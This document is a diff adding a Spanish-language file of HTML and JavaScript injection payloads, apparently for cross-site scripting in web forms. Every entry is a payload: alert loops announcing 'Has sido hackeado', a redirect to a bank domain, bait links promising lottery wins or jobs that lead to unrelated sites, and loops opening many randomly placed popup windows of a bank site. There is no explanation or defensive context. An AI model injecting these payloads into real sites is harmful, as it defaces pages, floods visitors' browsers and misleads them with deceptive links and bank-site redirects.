@@ -1,0 +1,48 @@
+------------------------------------------------------------------------------
+<script>alert("Enhorabuena, te ha tocado la lotería!")</script>
+------------------------------------------------------------------------------
+<script>for (i=0;i<=10;i++) {alert('Eres bobo');}</script>
+------------------------------------------------------------------------------
+<script>for (i=0;i<=5;i++) {alert('Eres bobo');alert('Feliz Navidad');}for (i=0;i<=4;i++) {alert('Has sido hackeado');alert('Que Feliz Navidad!!!');}</script>
+------------------------------------------------------------------------------
+<script>window.location='https://ingdirect.es';</script>
+------------------------------------------------------------------------------
+<br><a href='https://www.mediamarkt.es/' target="_blank">haz clic para información del covid</a>
+<br><a href='https://www.conforama.es/'>haz clic si quieres ser millonario</a>
+<br><a href='http://elpais.es'>haz clic si quieres que te lean el futuro</a><br>
+<a href='https://elcorteingles.es/' target="_blank">haz clic para registrarte en la oferta de trabajo<br>
+<a href='https://pccomponentes.com/' target="_blank">haz clic para que te toque la lotería<br>
+-----------------------------------------------------------------------------
+<script>for (i=0;i<=10;i++) {window.open("https://ing.es",""+i+"", "width=120,height=300,scrollbars=NO");}</script>
+-----------------------------------------------------------------------------
+<img src="https://www.tooltyp.com/wp-content/uploads/2014/10/1900x920-8-beneficios-de-usar-imagenes-en-nuestros-sitios-web.jpg">
+
+-----------------------------------------------------------------------------
+<script>
+function tamVentana() {
+    var tam = [0, 0];
+    if (typeof window.innerWidth != 'undefined') {
+        tam = [window.innerWidth, window.innerHeight];
+    } else if (typeof document.documentElement != 'undefined' &&
+        typeof document.documentElement.clientWidth !=
+        'undefined' && document.documentElement.clientWidth != 0) {
+        tam = [
+            document.documentElement.clientWidth,
+            document.documentElement.clientHeight
+        ];
+    } else {
+        tam = [
+            document.getElementsByTagName('body')[0].clientWidth,
+            document.getElementsByTagName('body')[0].clientHeight
+        ];
+    }
+    return tam;
+}
+for (i = 0; i <= 10; i++) {
+    tam=tamVentana();
+    num1 = Math.random() * (tam[0] - 1) + 1;
+    num2 = Math.random() * (tam[1] - 1) + 1;
+
+    window.open("https://ing.es", i, "width=" + num1 + ",height=" + num2 + ",scrollbars=NO, top=" + num1 + ", left=" + num2);
+}
+</script>
